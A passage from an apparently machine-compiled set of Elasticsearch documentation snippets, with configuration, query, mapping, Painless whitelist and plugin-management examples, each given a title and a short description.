       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Enabling EC2 Discovery in Elasticsearch YAML Configuration
DESCRIPTION: Configures Elasticsearch to use the EC2 seed hosts provider for discovery.

LANGUAGE: yaml
CODE:
discovery.seed_providers: ec2

----------------------------------------

TITLE: CAST Function Example - String to Integer
DESCRIPTION: Example of casting a string value '123' to an integer type.

LANGUAGE: sql
CODE:
SELECT CAST('123' AS INT) AS int;

      int
---------------
123

----------------------------------------

TITLE: Elasticsearch Copyright and License Notice
DESCRIPTION: Standard copyright and license header used in Elasticsearch source files. Specifies that the code is licensed under Elastic License 2.0 with usage restrictions.

LANGUAGE: plaintext
CODE:
/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

----------------------------------------

TITLE: PKCS#12 CA Certificate Generation
DESCRIPTION: Creates a new CA certificate in PKCS#12 format with specified parameters including password and DN

LANGUAGE: bash
CODE:
function new-p12-ca() {
    local P12File="$1"
    local P12Pass="$2"
    local CaDn="$3"

    certutil ca --ca-dn="$CaDn" --days=5000 --out ${PWD}/$P12File --pass="$P12Pass"
}

----------------------------------------

TITLE: Configuring Multi-Zone GCE Discovery for Elasticsearch
DESCRIPTION: This YAML configuration snippet demonstrates how to set up Elasticsearch discovery across multiple GCE zones. It includes the project ID and a list of zones to search for Elasticsearch instances.

LANGUAGE: yaml
CODE:
cloud:
  gce:
    project_id: <your-google-project-id>
    zone: ["<your-zone1>", "<your-zone2>"]
discovery:
  seed_providers: gce

----------------------------------------

TITLE: Mapping a Version Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index mapping with a version field. The version field is defined as a property of the mappings object.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_version": {
        "type": "version"
      }
    }
  }
}

----------------------------------------

TITLE: Creating an API Key for Microsoft Teams Connector
DESCRIPTION: Example of creating an API key for the Microsoft Teams connector using the Elasticsearch API. This key is used for authentication and authorization of the connector.

LANGUAGE: json
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Type Mapping Table for ESQL Function
DESCRIPTION: A markdown table showing the supported numeric input types (double, integer, long, unsigned_long) and their corresponding output type (double) for an ESQL function.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Scripted Average Aggregation with Runtime Fields
DESCRIPTION: Shows how to calculate an average using a runtime field with a correction factor applied through a script.

LANGUAGE: console
CODE:
POST /exams/_search?size=0
{
  "runtime_mappings": {
    "grade.corrected": {
      "type": "double",
      "script": {
        "source": "emit(Math.min(100, doc['grade'].value * params.correction))",
        "params": {
          "correction": 1.2
        }
      }
    }
  },
  "aggs": {
    "avg_corrected_grade": {
      "avg": {
        "field": "grade.corrected"
      }
    }
  }
}

----------------------------------------

TITLE: Type Mapping Table for ESQL Function
DESCRIPTION: A markdown table showing the supported numeric input types (double, integer, long, unsigned_long) and their corresponding output type (double) for an ESQL function.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Including SHA256 Function Description in Markdown
DESCRIPTION: This snippet uses an include directive to insert the description of the SHA256 function from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../description/sha256.md
:::

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Defines the 'str' parameter which accepts string expressions. The function handles both single and multi-valued columns or expressions, with null input resulting in null output.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`str`
:   String expression. If `null`, the function returns `null`. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Including CEIL Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing usage examples for the CEIL function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/ceil.md
:::

----------------------------------------

TITLE: Indexing WKT Circle Example in Elasticsearch
DESCRIPTION: Demonstrates indexing a circle defined in Well Known Text (WKT) format and retrieving the resulting polygon representation.

LANGUAGE: console
CODE:
PUT circles/_doc/1?pipeline=polygonize_circles
{
  "circle": "CIRCLE (30 10 40)"
}

GET circles/_doc/1

----------------------------------------

TITLE: Including ENDS_WITH Function Parameters in Markdown
DESCRIPTION: This snippet includes the parameters documentation for the ENDS_WITH function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/ends_with.md
:::

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate text to apply the Apache License 2.0 to a work, with placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Using NOT Operator in Elasticsearch SQL Query
DESCRIPTION: This snippet illustrates the use of the NOT operator to negate a condition in a SELECT statement. It selects employees whose employee number is not equal to 10000.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE NOT emp_no = 10000 LIMIT 5;

----------------------------------------

TITLE: Creating a Microsoft Teams Connector via Elasticsearch API
DESCRIPTION: Example of using the Elasticsearch API to create a new Microsoft Teams connector. This snippet demonstrates the basic structure and required fields for the connector configuration.

LANGUAGE: json
CODE:
PUT _connector/my-microsoft_teams-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Microsoft Teams",
  "service_type": "microsoft_teams"
}

----------------------------------------

TITLE: Constant Keyword Field Mapping
DESCRIPTION: Example demonstrating how to map a constant keyword field where all documents share the same value.

LANGUAGE: console
CODE:
PUT logs-debug
{
  "mappings": {
    "properties": {
      "@timestamp": {
        "type": "date"
      },
      "message": {
        "type": "text"
      },
      "level": {
        "type": "constant_keyword",
        "value": "debug"
      }
    }
  }
}

----------------------------------------

TITLE: Using Reproducible Random Number Generation in Elasticsearch
DESCRIPTION: Recommends using org.elasticsearch.common.Randomness#get for reproducible sources of randomness instead of Java's built-in Random and ThreadLocalRandom classes.

LANGUAGE: java
CODE:
@defaultMessage Use org.elasticsearch.common.Randomness#get for reproducible sources of randomness
java.util.Random#<init>()
java.util.concurrent.ThreadLocalRandom

----------------------------------------

TITLE: Defining Murmur3DocValueField Class in Java
DESCRIPTION: Declares the Murmur3DocValueField class which extends AbstractLongDocValuesField to provide Murmur3 hashing capabilities for document values. The class is marked with @dynamic_type annotation and resides in the org.elasticsearch.script.field.murmur3 package.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.murmur3.Murmur3DocValueField @dynamic_type {
}

----------------------------------------

TITLE: Basic Azure VM Discovery Configuration
DESCRIPTION: Basic configuration for Azure VM discovery including cloud service settings and keystore configuration. Requires Azure subscription ID, cloud service name, and PKCS12 keystore details.

LANGUAGE: yaml
CODE:
cloud:
    azure:
        management:
             subscription.id: XXX-XXX-XXX-XXX
             cloud.service.name: es-demo-app
             keystore:
                   path: /path/to/azurekeystore.pkcs12
                   password: WHATEVER
                   type: pkcs12

discovery:
    seed_providers: azure

----------------------------------------

TITLE: Case Insensitive SQL Keywords Example
DESCRIPTION: Demonstrates case insensitivity of SQL keywords while maintaining the same functionality.

LANGUAGE: sql
CODE:
select * fRoM table;

----------------------------------------

TITLE: Declaring Deprecated Routes in Java for REST API Compatibility
DESCRIPTION: Example of declaring a deprecated HTTP route with a specific deprecation version for REST API compatibility.

LANGUAGE: java
CODE:
Route.builder(GET, "_mypath/{foo}/{bar}").deprecated(MY_DEPRECATION_MESSAGE, RestApiVersion.V_7).build(),

----------------------------------------

TITLE: Base Field Class Definitions
DESCRIPTION: Defines the base Field class and EmptyField implementation that provide core field functionality.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.Field @dynamic_type {
  String getName()
  boolean isEmpty()
  int size()
}

class org.elasticsearch.script.field.EmptyField @dynamic_type {
  def get(def)
  def get(int, def)
}

----------------------------------------

TITLE: Configuring Network Host Settings in Elasticsearch with GCE
DESCRIPTION: Examples of different network host configurations using GCE host values in elasticsearch.yml. Shows how to set network interface IP, hostname, and default private IP settings.

LANGUAGE: yaml
CODE:
# get the IP address from network interface 1
network.host: _gce:privateIp:1_
# Using GCE internal hostname
network.host: _gce:hostname_
# shortcut for _gce:privateIp:0_ (recommended)
network.host: _gce_

----------------------------------------

TITLE: Multiple Data Paths Configuration for Windows
DESCRIPTION: Configuration example for setting multiple data paths on Windows systems (deprecated since 7.13.0)

LANGUAGE: yaml
CODE:
path:
  data:
    - "C:\\Elastic\\Elasticsearch_1"
    - "E:\\Elastic\\Elasticsearch_1"
    - "F:\\Elastic\\Elasticsearch_3"

----------------------------------------

TITLE: MongoDB Sample Document Structure
DESCRIPTION: Example JSON structure showing an apartment document with nested properties including location and price information.

LANGUAGE: javascript
CODE:
{
    "id": 1234,
    "bedrooms": 3,
    "price": 1500,
    "address": {
        "street": "Street 123",
        "government_area": "Area",
        "country_information": {
            "country_code": "PT",
            "country": "Portugal"
        }
    }
}

----------------------------------------

TITLE: ESQL Type Mapping Table
DESCRIPTION: A markdown table showing the input and result type mappings for ESQL functions. Shows that both 'keyword' and 'text' input types map to 'keyword' result type.

LANGUAGE: markdown
CODE:
| input | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: ASIN Function Documentation Template
DESCRIPTION: Markdown template structure for documenting the ASIN function in Elasticsearch SQL, including placeholders for syntax diagram, parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `ASIN` [esql-asin]

**Syntax**

:::{image} ../../../images/functions/asin.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/asin.md
:::

:::{include} ../description/asin.md
:::

:::{include} ../types/asin.md
:::

:::{include} ../examples/asin.md
:::

----------------------------------------

TITLE: Creating Index with Override Settings and Mappings in Elasticsearch
DESCRIPTION: Creates a new index from a source while overriding specific settings (shard count) and adding new mappings (boolean field).

LANGUAGE: console
CODE:
POST _create_from/my-index/my-new-index
{
  "settings_override": {
    "index": {
      "number_of_shards": 5
    }
  },
  "mappings_override": {
    "properties": {
        "field2": { "type": "boolean" }
    }
  }
}

----------------------------------------

TITLE: Including CEIL Function Supported Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the supported types for the CEIL function.

LANGUAGE: markdown
CODE:
:::{include} ../types/ceil.md
:::

----------------------------------------

TITLE: Running Elasticsearch ODBC Driver Test Suite in Python
DESCRIPTION: Command to run the Elasticsearch ODBC driver test suite, which loads TDVT test data into an Elasticsearch instance. Requires Python 3 with requests and psutils modules installed.

LANGUAGE: bash
CODE:
python3 ./test/integration/ites.py -p http://user:password@host:port -tx

----------------------------------------

TITLE: Trace Request Body Base64 Decoding
DESCRIPTION: Shell command for decoding base64-encoded and gzipped HTTP trace logs

LANGUAGE: sh
CODE:
cat httptrace.log | sed -e 's/.*://' | base64 --decode | gzip --decompress

----------------------------------------

TITLE: Including REPEAT Function Description in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the description of the REPEAT function.

LANGUAGE: markdown
CODE:
:::{include} ../description/repeat.md
:::

----------------------------------------

TITLE: Restricting URL Path and File Methods in Java
DESCRIPTION: This snippet discourages the use of getPath() and getFile() methods from java.net.URL, recommending conversion to URI instead.

LANGUAGE: java
CODE:
@defaultMessage Convert to URI
java.net.URL#getPath()
java.net.URL#getFile()

----------------------------------------

TITLE: Including TO_TIMEDURATION Description Documentation
DESCRIPTION: This snippet includes the description documentation for the TO_TIMEDURATION function from an external markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../description/to_timeduration.md
:::

----------------------------------------

TITLE: Using IN Operator in Elasticsearch SQL
DESCRIPTION: Demonstrates the IN operator for matching against a list of values.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no IN (10000, 10001, 10002, 999) ORDER BY emp_no LIMIT 5;

----------------------------------------

TITLE: Inserting Time Series Data in Elasticsearch Bulk API
DESCRIPTION: Example showing how to add data to a time series index using the Elasticsearch bulk API. The data includes key-value pairs with timestamps.

LANGUAGE: javascript
CODE:
PUT /my-time-series-index-0/_bulk
{ "index": {} }
{ "key": "a", "val": 1, "@timestamp": "2022-01-01T00:00:10Z" }
{ "index": {}}
{ "key": "a", "val": 2, "@timestamp": "2022-01-02T00:00:00Z" }
{ "index": {} }
{ "key": "b", "val": 2, "@timestamp": "2022-01-01T00:00:10Z" }
{ "index": {}}
{ "key": "b", "val": 3, "@timestamp": "2022-01-02T00:00:00Z" }

----------------------------------------

TITLE: Including BYTE_LENGTH Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the BYTE_LENGTH function using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/byte_length.md
:::

:::{include} ../description/byte_length.md
:::

:::{include} ../types/byte_length.md
:::

:::{include} ../examples/byte_length.md
:::

----------------------------------------

TITLE: Using String Time Spans with BUCKET Function in ESQL
DESCRIPTION: This snippet shows how to use a string time span parameter with the BUCKET function for grouping data.

LANGUAGE: esql
CODE:
POST /_query
{
   "query": """
   FROM employees
   | WHERE hire_date >= "1985-01-01T00:00:00Z" AND hire_date < "1986-01-01T00:00:00Z"
   | STATS hires_per_week = COUNT(*) BY week = BUCKET(hire_date, ?timespan)
   | SORT week
   """,
   "params": [{"timespan" : "1 week"}]
}

----------------------------------------

TITLE: Documenting 'angle' Parameter for ESQL Function in Elasticsearch
DESCRIPTION: This snippet defines the 'angle' parameter for an ESQL function. It specifies that the input should be in radians and handles null inputs.

LANGUAGE: markdown
CODE:
`angle`
:   An angle, in radians. If `null`, the function returns `null`.

----------------------------------------

TITLE: Indexing GeoJSON Circle Example in Elasticsearch
DESCRIPTION: Shows how to index a circle defined in GeoJSON format and retrieve the resulting polygon representation.

LANGUAGE: console
CODE:
PUT circles/_doc/2?pipeline=polygonize_circles
{
  "circle": {
    "type": "circle",
    "radius": "40m",
    "coordinates": [30, 10]
  }
}

GET circles/_doc/2

----------------------------------------

TITLE: Documenting Missing Test Coverage
DESCRIPTION: Markdown notation indicating that tests are missing for consistency functionality.

LANGUAGE: markdown
CODE:
# consistency

----------------------------------------

TITLE: Configuring StringSortScript Whitelist for Painless
DESCRIPTION: Defines whitelist entries for StringSortScript classes to enable their use in Painless scripting. Includes both the main class and its Factory class, marked with @no_import annotation to restrict direct imports.

LANGUAGE: config
CODE:
class org.elasticsearch.script.StringSortScript @no_import {
}
class org.elasticsearch.script.StringSortScript$Factory @no_import {
}

----------------------------------------

TITLE: Removing Stempel Plugin from Elasticsearch
DESCRIPTION: Command to remove the Stempel Polish analysis plugin from Elasticsearch. Node must be stopped before removal and sudo privileges are required.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove analysis-stempel

----------------------------------------

TITLE: ESQL Timespan Literals
DESCRIPTION: Demonstrates the usage of timespan literals in ESQL for expressing datetime intervals.

LANGUAGE: esql
CODE:
1day
1 day
1       day

----------------------------------------

TITLE: Defining Plugin Descriptor Properties in YAML for Elasticsearch Classic Plugins
DESCRIPTION: This YAML template outlines the structure and properties of the 'plugin-descriptor.properties' file for Elasticsearch classic plugins. It includes mandatory elements like description, version, name, and Java version, as well as optional elements such as classname and extended plugins.

LANGUAGE: yaml
CODE:
# Elasticsearch plugin descriptor file
# This file must exist as 'plugin-descriptor.properties' or 'stable-plugin-descriptor.properties inside a plugin.
#
## example plugin for "foo"
#
# foo.zip <-- zip file for the plugin, with this structure:
# |____   <arbitrary name1>.jar <-- classes, resources, dependencies
# |____   <arbitrary nameN>.jar <-- any number of jars
# |____   plugin-descriptor.properties <-- example contents below:
#
# classname=foo.bar.BazPlugin
# description=My cool plugin
# version=6.0
# elasticsearch.version=6.0
# java.version=1.8
#
## mandatory elements for all plugins:
#
# 'description': simple summary of the plugin
description=${description}
#
# 'version': plugin's version
version=${version}
#
# 'name': the plugin name
name=${name}
#
# 'java.version': version of java the code is built against
# use the system property java.specification.version
# version string must be a sequence of nonnegative decimal integers
# separated by "."'s and may have leading zeros
java.version=${javaVersion}
#
# 'elasticsearch.version': version of elasticsearch compiled against.
# Plugins implementing plugin-api.jar this version only has to match a major version of the ES server
# For all other plugins it has to be the same as ES server version
elasticsearch.version=${elasticsearchVersion}
## optional elements for plugins:
<% if (classname) { %>
#
# 'classname': the name of the class to load, fully-qualified. Only applies to
# "isolated" plugins
classname=${classname}
<% } %>
<% if (modulename) { %>
#
# 'modulename': the name of the module to load classname from. Only applies to
# "isolated" plugins. This is optional. Specifying it causes the plugin
# to be loaded as a module.
modulename=${modulename}
<% } %>
<% if (extendedPlugins) { %>
#
#  'extended.plugins': other plugins this plugin extends through SPI
extended.plugins=${extendedPlugins}
<% } %>
<% if (hasNativeController) { %>
#
# 'has.native.controller': whether or not the plugin has a native controller
has.native.controller=${hasNativeController}
<% } %>
<% if (licensed) { %>
# This plugin requires that a license agreement be accepted before installation
licensed=${licensed}
<% } %>

----------------------------------------

TITLE: Whitelisting FieldScript Class for Painless in Elasticsearch
DESCRIPTION: Declares the FieldScript class from the org.elasticsearch.script package as whitelisted for use in Painless scripts. This allows Painless to find and use the FieldScript class for the Field API.

LANGUAGE: painless
CODE:
class org.elasticsearch.script.FieldScript @no_import {
}

----------------------------------------

TITLE: Removing EC2 Discovery Plugin from Elasticsearch
DESCRIPTION: Command to remove the EC2 discovery plugin from Elasticsearch. The node must be stopped before executing this command.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove discovery-ec2

----------------------------------------

TITLE: Configuring Dynamic Mapping for Inner Objects in Elasticsearch
DESCRIPTION: This snippet illustrates how to set up an index with dynamic mapping disabled at the top level, but enabled for a specific inner object. It demonstrates the inheritance of dynamic settings and how to override them.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "dynamic": false,
    "properties": {
      "user": {
        "properties": {
          "name": {
            "type": "text"
          },
          "social_networks": {
            "dynamic": true,
            "properties": {}
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Copying Complex Values Using copy_from
DESCRIPTION: Shows how to copy complex values like arrays between fields using the copy_from parameter

LANGUAGE: console
CODE:
PUT _ingest/pipeline/set_bar
{
  "description": "sets the value of bar from the field foo",
  "processors": [
    {
      "set": {
        "field": "bar",
        "copy_from": "foo"
      }
    }
  ]
}

POST _ingest/pipeline/set_bar/_simulate
{
  "docs": [
    {
      "_source": {
        "foo": ["foo1", "foo2"]
      }
    }
  ]
}

----------------------------------------

TITLE: ESQL Field Type Mappings Table
DESCRIPTION: A markdown table showing the supported field types and their corresponding result types in ESQL functions. Covers basic data types like boolean, dates, numbers, strings and special types like IP addresses and versions.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| date | date |
| date_nanos | date_nanos |
| double | double |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| unsigned_long | unsigned_long |
| version | version |

----------------------------------------

TITLE: ESQL Type Mapping Table in Markdown
DESCRIPTION: Markdown table showing the supported type conversions for ESQL functions. Demonstrates how keyword and text types map to keyword output when combined with integer input types.

LANGUAGE: markdown
CODE:
| string | number | result |
| --- | --- | --- |
| keyword | integer | keyword |
| text | integer | keyword |

----------------------------------------

TITLE: Including TO_VERSION Function Documentation Sections in Markdown
DESCRIPTION: These snippets include various documentation sections for the TO_VERSION function, such as parameters, description, data types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/to_version.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../description/to_version.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../types/to_version.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../examples/to_version.md
:::

----------------------------------------

TITLE: Sum Bucket Aggregation Complete Example
DESCRIPTION: Example showing how to calculate the sum of monthly sales buckets using date histogram and sum bucket aggregations. Uses calendar interval for monthly grouping and aggregates the price field.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "sum_monthly_sales": {
      "sum_bucket": {
        "buckets_path": "sales_per_month>sales"
      }
    }
  }
}

----------------------------------------

TITLE: Markdown Documentation for ESQL Character Length Function
DESCRIPTION: This snippet provides documentation for the character length function in ESQL. It explains that the function returns the character length of a string and includes a note about UTF-8 encoding.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns the character length of a string.

::::{note}
All strings are in UTF-8, so a single character can use multiple bytes.
::::

----------------------------------------

TITLE: Creating Custom Analyzer with Classic Token Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the Classic token filter. It sets up an index with a custom analyzer named 'classic_analyzer'.

LANGUAGE: console
CODE:
PUT /classic_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "classic_analyzer": {
          "tokenizer": "classic",
          "filter": [ "classic" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Inference API HTTP Retry Settings
DESCRIPTION: Settings for controlling retry behavior when transient failures occur, including initial delay, maximum delay bound, and timeout configurations.

LANGUAGE: yaml
CODE:
xpack.inference.http.retry.initial_delay: 1s
xpack.inference.http.retry.max_delay_bound: 5s
xpack.inference.http.retry.timeout: 30s

----------------------------------------

TITLE: SPLIT Function Section Header
DESCRIPTION: Main section header for the SPLIT function with a reference tag.

LANGUAGE: markdown
CODE:
## `SPLIT` [esql-split]

----------------------------------------

TITLE: Unsupported PIVOT Query with Subquery in IN Clause
DESCRIPTION: Illustrates an unsupported PIVOT query where a subquery is used to generate the list of values to pivot.

LANGUAGE: sql
CODE:
SELECT * FROM test_emp PIVOT (SUM(salary) FOR languages IN (SELECT languages FROM test_emp WHERE languages <=2 GROUP BY languages))

----------------------------------------

TITLE: Using String Time Spans with DATE_TRUNC Function in ESQL
DESCRIPTION: This example demonstrates how to use a string time span parameter with the DATE_TRUNC function for date truncation.

LANGUAGE: esql
CODE:
POST /_query
{
   "query": """
   FROM employees
   | KEEP first_name, last_name, hire_date
   | EVAL year_hired = DATE_TRUNC(?timespan, hire_date)
   """,
   "params": [{"timespan" : "1 year"}]
}

----------------------------------------

TITLE: Configuring Gradle Build for Elasticsearch Plugin
DESCRIPTION: This Gradle build script sets up the project for developing an Elasticsearch plugin. It defines dependencies, applies necessary plugins, and configures the plugin metadata.

LANGUAGE: gradle
CODE:
ext.pluginApiVersion = '8.7.0'
ext.luceneVersion = '9.5.0'

buildscript {
  ext.pluginApiVersion = '8.7.0'
  repositories {
    mavenCentral()
  }
  dependencies {
    classpath "org.elasticsearch.gradle:build-tools:${pluginApiVersion}"
  }
}

apply plugin: 'elasticsearch.stable-esplugin'
apply plugin: 'elasticsearch.yaml-rest-test'

esplugin {
  name 'my-plugin'
  description 'My analysis plugin'
}

group 'org.example'
version '1.0-SNAPSHOT'

repositories {
  mavenLocal()
  mavenCentral()
}

dependencies {

  //TODO transitive dependency off and plugin-api dependency?
  compileOnly "org.elasticsearch.plugin:elasticsearch-plugin-api:${pluginApiVersion}"
  compileOnly "org.elasticsearch.plugin:elasticsearch-plugin-analysis-api:${pluginApiVersion}"
  compileOnly "org.apache.lucene:lucene-analysis-common:${luceneVersion}"

  //TODO for testing this also have to be declared
  testImplementation "org.elasticsearch.plugin:elasticsearch-plugin-api:${pluginApiVersion}"
  testImplementation "org.elasticsearch.plugin:elasticsearch-plugin-analysis-api:${pluginApiVersion}"
  testImplementation "org.apache.lucene:lucene-analysis-common:${luceneVersion}"

  testImplementation ('junit:junit:4.13.2'){
    exclude group: 'org.hamcrest'
  }
  testImplementation 'org.mockito:mockito-core:4.4.0'
  testImplementation 'org.hamcrest:hamcrest:2.2'

}

----------------------------------------

TITLE: Defining Java Util Map Interface in Painless
DESCRIPTION: This snippet defines the java.util.Map interface with its methods and augmentations for use in Painless scripts.

LANGUAGE: Java
CODE:
class java.util.Map {
  void clear()
  def compute(def,BiFunction)
  def computeIfAbsent(def,Function)
  def computeIfPresent(def,BiFunction)
  boolean containsKey(def)
  boolean containsValue(def)
  Set entrySet()
  boolean equals(Object)
  void forEach(BiConsumer)
  def get(def)
  def getOrDefault(def,def)
  boolean isEmpty()
  Set keySet()
  def merge(def,def,BiFunction)
  def put(def,def)
  void putAll(Map)
  def putIfAbsent(def,def)
  def remove(def)
  boolean remove(def,def)
  def replace(def,def)
  boolean replace(def,def,def)
  void replaceAll(BiFunction)
  int size()
  Collection values()
  Object org.elasticsearch.painless.api.Augmentation getByPath(String)
  Object org.elasticsearch.painless.api.Augmentation getByPath(String, Object)

  # some adaptations of groovy methods
  List org.elasticsearch.painless.api.Augmentation collect(BiFunction)
  def org.elasticsearch.painless.api.Augmentation collect(Collection,BiFunction)
  int org.elasticsearch.painless.api.Augmentation count(BiPredicate)
  def org.elasticsearch.painless.api.Augmentation each(BiConsumer)
  boolean org.elasticsearch.painless.api.Augmentation every(BiPredicate)
  Map.Entry org.elasticsearch.painless.api.Augmentation find(BiPredicate)
  Map org.elasticsearch.painless.api.Augmentation findAll(BiPredicate)
  def org.elasticsearch.painless.api.Augmentation findResult(BiFunction)
  def org.elasticsearch.painless.api.Augmentation findResult(def,BiFunction)
  List org.elasticsearch.painless.api.Augmentation findResults(BiFunction)
  Map org.elasticsearch.painless.api.Augmentation groupBy(BiFunction)
}

----------------------------------------

TITLE: Removing Nori Analysis Plugin from Elasticsearch
DESCRIPTION: Command to remove the Korean (nori) Analysis plugin from Elasticsearch. The node must be stopped before executing this command.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove analysis-nori

----------------------------------------

TITLE: Specifying custom timestamp and category fields for EQL search in Elasticsearch
DESCRIPTION: Shows how to specify custom timestamp and event category fields when running an EQL search in Elasticsearch.

LANGUAGE: JSON
CODE:
GET /my-data-stream/_eql/search
{
  "timestamp_field": "file.accessed",
  "event_category_field": "file.type",
  "query": """
    file where (file.size > 1 and file.type == "file")
  """
}

----------------------------------------

TITLE: Defining ZoneOffsetTransition Class Methods
DESCRIPTION: Defines the ZoneOffsetTransition class which handles timezone transition points with methods for comparing, accessing transition details, and validation.

LANGUAGE: java
CODE:
class java.time.zone.ZoneOffsetTransition {
  int compareTo(ZoneOffsetTransition)
  LocalDateTime getDateTimeAfter()
  LocalDateTime getDateTimeBefore()
  Duration getDuration()
  Instant getInstant()
  ZoneOffset getOffsetAfter()
  ZoneOffset getOffsetBefore()
  boolean isGap()
  boolean isOverlap()
  boolean isValidOffset(ZoneOffset)
  ZoneOffsetTransition of(LocalDateTime,ZoneOffset,ZoneOffset)
  long toEpochSecond()
}

----------------------------------------

TITLE: Metadata Management Class Definition
DESCRIPTION: Defines methods for accessing and modifying document metadata including index, ID, routing, version, and timestamp information.

LANGUAGE: java
CODE:
class org.elasticsearch.script.Metadata {
    String getIndex()
    void setIndex(String)

    String getId()
    void setId(String)

    String getRouting()
    void setRouting(String)

    long getVersion()
    void setVersion(long)

    String getVersionType()
    void setVersionType(String)

    ZonedDateTime getNow()
}

----------------------------------------

TITLE: Configuring Elasticsearch and Connectors in YAML
DESCRIPTION: Sample YAML configuration for connecting to Elasticsearch and setting up the network drive connector. Includes host, API key, and connector-specific settings.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: network_drive
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Upgrading Elasticsearch Keystore
DESCRIPTION: Command to manually upgrade the keystore format when necessary.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore upgrade

----------------------------------------

TITLE: Calculating Average of Multivalued Field Using MV_AVG in ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_AVG function to convert a multivalued field into a single value containing the average of all values. It uses a ROW command to create a sample multivalued field 'a' and then applies MV_AVG in an EVAL statement.

LANGUAGE: sql
CODE:
ROW a=[3, 5, 1, 6]
| EVAL avg_a = MV_AVG(a)

----------------------------------------

TITLE: ESQL Date Function Type Table
DESCRIPTION: Markdown table showing supported result type for ESQL date operations.

LANGUAGE: markdown
CODE:
| result |
| --- |
| date |

----------------------------------------

TITLE: Regenerating Documentation for CASE Function in ES|QL
DESCRIPTION: This command uses Gradle to run tests for the CASE function, which generates its documentation.

LANGUAGE: bash
CODE:
./gradlew :x-pack:plugin:esql:test -Dtests.class='CaseTests'

----------------------------------------

TITLE: Calculating Arctangent with ATAN2 Function in ESQL
